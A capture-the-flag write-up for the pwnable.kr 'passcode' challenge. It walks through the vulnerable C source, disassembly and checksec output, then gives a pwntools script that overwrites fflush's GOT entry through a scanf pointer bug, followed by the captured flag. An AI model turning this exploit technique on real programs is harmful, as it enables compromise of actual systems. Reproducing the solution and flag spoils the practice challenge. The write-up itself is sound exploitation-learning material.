# passcode
## Analysis
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.1 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

There are 3 inputs:
- `scanf("%100s", name)`
- `scanf("%d", passcode1)`
- `scanf("%d", passcode2)`

More importantly, for single value data types like `int`, `&` infront of variable is needed to represent its location in memory.

`scanf("%d", &passcode1)` correctly writes input to `passcode1` variable, whereas `scanf("%d", passcode1)` passes value of `passcode1` into `scanf` which gets viewed as a memory address to store into.

Check security of file to know usable exploits:
```bash
passcode@ubuntu:~$ checksec ./passcode
[*] '/home/passcode/passcode'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
Partial RELRO = GOT overwrite, No PIE = static address at runtime.

Use `gdb` for dynamic analysis

```asm
pwndbg> disass welcome
Dump of assembler code for function welcome:
   0x080492f2 <+0>:     push   ebp
   0x080492f3 <+1>:     mov    ebp,esp
   0x080492f5 <+3>:     push   ebx
   0x080492f6 <+4>:     sub    esp,0x74
   0x080492f9 <+7>:     call   0x8049130 <__x86.get_pc_thunk.bx>
   0x080492fe <+12>:    add    ebx,0x2d02
   0x08049304 <+18>:    mov    eax,gs:0x14
   0x0804930a <+24>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804930d <+27>:    xor    eax,eax
   0x0804930f <+29>:    sub    esp,0xc
   0x08049312 <+32>:    lea    eax,[ebx-0x1f9d]
   0x08049318 <+38>:    push   eax
   0x08049319 <+39>:    call   0x8049050 <printf@plt>
   0x0804931e <+44>:    add    esp,0x10
   0x08049321 <+47>:    sub    esp,0x8
   0x08049324 <+50>:    lea    eax,[ebp-0x70]
   0x08049327 <+53>:    push   eax
   0x08049328 <+54>:    lea    eax,[ebx-0x1f8b]
   0x0804932e <+60>:    push   eax
   0x0804932f <+61>:    call   0x80490d0 <__isoc99_scanf@plt>
   0x08049334 <+66>:    add    esp,0x10
   0x08049337 <+69>:    sub    esp,0x8
   0x0804933a <+72>:    lea    eax,[ebp-0x70]
   0x0804933d <+75>:    push   eax
   0x0804933e <+76>:    lea    eax,[ebx-0x1f85]
   0x08049344 <+82>:    push   eax
   0x08049345 <+83>:    call   0x8049050 <printf@plt>
   0x0804934a <+88>:    add    esp,0x10
   0x0804934d <+91>:    nop
   0x0804934e <+92>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08049351 <+95>:    sub    eax,DWORD PTR gs:0x14
   0x08049358 <+102>:   je     0x804935f <welcome+109>
   0x0804935a <+104>:   call   0x80493c0 <__stack_chk_fail_local>
   0x0804935f <+109>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049362 <+112>:   leave
   0x08049363 <+113>:   ret
End of assembler dump.
```
Look at setup for `scanf` call:
```asm
0x08049324 <+50>:    lea    eax,[ebp-0x70]
0x08049327 <+53>:    push   eax
0x08049328 <+54>:    lea    eax,[ebx-0x1f8b]
0x0804932e <+60>:    push   eax
0x0804932f <+61>:    call   0x80490d0 <__isoc99_scanf@plt>
```
`ebp-0x70` is second argument which is our `char name[100]`. Now look at `login`:
```asm
pwndbg> disass login
Dump of assembler code for function login:
   0x080491f6 <+0>:     push   ebp
   0x080491f7 <+1>:     mov    ebp,esp
   0x080491f9 <+3>:     push   esi
   0x080491fa <+4>:     push   ebx
   0x080491fb <+5>:     sub    esp,0x10
   0x080491fe <+8>:     call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049203 <+13>:    add    ebx,0x2dfd
   0x08049209 <+19>:    sub    esp,0xc
   0x0804920c <+22>:    lea    eax,[ebx-0x1ff8]
   0x08049212 <+28>:    push   eax
   0x08049213 <+29>:    call   0x8049050 <printf@plt>
   0x08049218 <+34>:    add    esp,0x10
   0x0804921b <+37>:    sub    esp,0x8
   0x0804921e <+40>:    push   DWORD PTR [ebp-0x10]
   0x08049221 <+43>:    lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:    push   eax
   0x08049228 <+50>:    call   0x80490d0 <__isoc99_scanf@plt>
   0x0804922d <+55>:    add    esp,0x10
   0x08049230 <+58>:    mov    eax,DWORD PTR [ebx-0x4]
   0x08049236 <+64>:    mov    eax,DWORD PTR [eax]
   0x08049238 <+66>:    sub    esp,0xc
   0x0804923b <+69>:    push   eax
   0x0804923c <+70>:    call   0x8049060 <fflush@plt>
   0x08049241 <+75>:    add    esp,0x10
   0x08049244 <+78>:    sub    esp,0xc
   0x08049247 <+81>:    lea    eax,[ebx-0x1fe2]
   0x0804924d <+87>:    push   eax
   0x0804924e <+88>:    call   0x8049050 <printf@plt>
   0x08049253 <+93>:    add    esp,0x10
   0x08049256 <+96>:    sub    esp,0x8
   0x08049259 <+99>:    push   DWORD PTR [ebp-0xc]
   0x0804925c <+102>:   lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>:   push   eax
   0x08049263 <+109>:   call   0x80490d0 <__isoc99_scanf@plt>
   0x08049268 <+114>:   add    esp,0x10
   0x0804926b <+117>:   sub    esp,0xc
   0x0804926e <+120>:   lea    eax,[ebx-0x1fcf]
   0x08049274 <+126>:   push   eax
   0x08049275 <+127>:   call   0x8049090 <puts@plt>
   0x0804927a <+132>:   add    esp,0x10
   0x0804927d <+135>:   cmp    DWORD PTR [ebp-0x10],0x528e6
   0x08049284 <+142>:   jne    0x80492ce <login+216>
   0x08049286 <+144>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:   jne    0x80492ce <login+216>
   0x0804928f <+153>:   sub    esp,0xc
   0x08049292 <+156>:   lea    eax,[ebx-0x1fc3]
   0x08049298 <+162>:   push   eax
   0x08049299 <+163>:   call   0x8049090 <puts@plt>
   0x0804929e <+168>:   add    esp,0x10
   0x080492a1 <+171>:   call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:   mov    esi,eax
   0x080492a8 <+178>:   call   0x8049080 <getegid@plt>
   0x080492ad <+183>:   sub    esp,0x8
   0x080492b0 <+186>:   push   esi
   0x080492b1 <+187>:   push   eax
   0x080492b2 <+188>:   call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:   add    esp,0x10
   0x080492ba <+196>:   sub    esp,0xc
   0x080492bd <+199>:   lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:   push   eax
   0x080492c4 <+206>:   call   0x80490a0 <system@plt>
   0x080492c9 <+211>:   add    esp,0x10
   0x080492cc <+214>:   jmp    0x80492ea <login+244>
   0x080492ce <+216>:   sub    esp,0xc
   0x080492d1 <+219>:   lea    eax,[ebx-0x1fab]
   0x080492d7 <+225>:   push   eax
   0x080492d8 <+226>:   call   0x8049090 <puts@plt>
   0x080492dd <+231>:   add    esp,0x10
   0x080492e0 <+234>:   sub    esp,0xc
   0x080492e3 <+237>:   push   0x0
   0x080492e5 <+239>:   call   0x80490b0 <exit@plt>
   0x080492ea <+244>:   nop
   0x080492eb <+245>:   lea    esp,[ebp-0x8]
   0x080492ee <+248>:   pop    ebx
   0x080492ef <+249>:   pop    esi
   0x080492f0 <+250>:   pop    ebp
   0x080492f1 <+251>:   ret
End of assembler dump.
```
Setup for `scanf` calls:
```asm
0x0804921e <+40>:    push   DWORD PTR [ebp-0x10]
0x08049221 <+43>:    lea    eax,[ebx-0x1fe5]
0x08049227 <+49>:    push   eax
0x08049228 <+50>:    call   0x80490d0 <__isoc99_scanf@plt>
```
```asm
0x08049259 <+99>:    push   DWORD PTR [ebp-0xc]
0x0804925c <+102>:   lea    eax,[ebx-0x1fe5]
0x08049262 <+108>:   push   eax
0x08049263 <+109>:   call   0x80490d0 <__isoc99_scanf@plt>
```
`ebp-0x10` is `passcode1`. `ebp-0xc` is `passcode2`.

We have:
- `ebp-0x70` name[100]
- `ebp-0x10` passcode1
- `ebp-0xc` passcode2

But wait, `ebp-0x70` + `100` (decimal) = `ebp-0xc` (passcode2). We can't overwrite passcode2 due to 100 char limit, thus it's impossible to make the original condition true: `passcode1==338150 && passcode2==13371337`.

## Solution

Resort to GOT overwrite with `passcode1`.

Observe `system("/bin/cat flag")` call:
```asm
0x08049299 <+163>:   call   0x8049090 <puts@plt>
0x0804929e <+168>:   add    esp,0x10
0x080492a1 <+171>:   call   0x8049080 <getegid@plt>
0x080492a6 <+176>:   mov    esi,eax
0x080492a8 <+178>:   call   0x8049080 <getegid@plt>
0x080492ad <+183>:   sub    esp,0x8
0x080492b0 <+186>:   push   esi
0x080492b1 <+187>:   push   eax
0x080492b2 <+188>:   call   0x80490c0 <setregid@plt>
0x080492b7 <+193>:   add    esp,0x10
0x080492ba <+196>:   sub    esp,0xc
0x080492bd <+199>:   lea    eax,[ebx-0x1fb9]
0x080492c3 <+205>:   push   eax
0x080492c4 <+206>:   call   0x80490a0 <system@plt>
```
`0x080492c4` is the address of the call, **BUT** we need to consider that the program runs under special privilege which utilizes `getegid` and `setregid` to be able to print flag. So target address is `0x0804929e` (setup for `getregid`).

We find a simple function to overwrite like `fflush` which is instantly called after `password1` input:
```c
printf("enter passcode1 : ");
scanf("%d", passcode1);
fflush(stdin);
```
Find GOT address of `fflush`:
```asm
pwndbg> disass fflush
Dump of assembler code for function fflush@plt:
   0x08049060 <+0>:     jmp    DWORD PTR ds:0x804c014
   0x08049066 <+6>:     push   0x10
   0x0804906b <+11>:    jmp    0x8049030
End of assembler dump
```
`0x804c014` is GOT address, which is going to be replaced with `0x0804929e` call.

`passcode1` refers to a substring of `name[100]` and we `scanf` an integer into the value of `passcode1` as memory address.

That means we put `fflush` GOT address in `name` after a specific padding (now `passcode1` value refers to `fflush` address), and input the target memory address to `scanf`, overwriting the `fflush` address. So next time program calls `fflush`, it calls for the whole setup to print flag.

- `ebp-0x70` name[100]
- `ebp-0x10` passcode1

(-0x10) - (-0x70) = 0x60 = 96 bytes of padding.

```py
from pwn import *

p = remote('pwnable.kr',10004)

p.sendlineafter(b'enter you name :', b'A'*96+p32(0x804c014))
p.sendlineafter(b'enter passcode1 :', b'134517406')

p.interactive()
```
```bash
❯ python3 solve.py
[+] Opening connection to pwnable.kr on port 10004: Done
[*] Switching to interactive mode
 s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
Now I can safely trust you that you have credential :)
[*] Got EOF while reading in interactive
$
```
Flag: `s0rry_mom_I_just_ign0red_c0mp1ler_w4rning`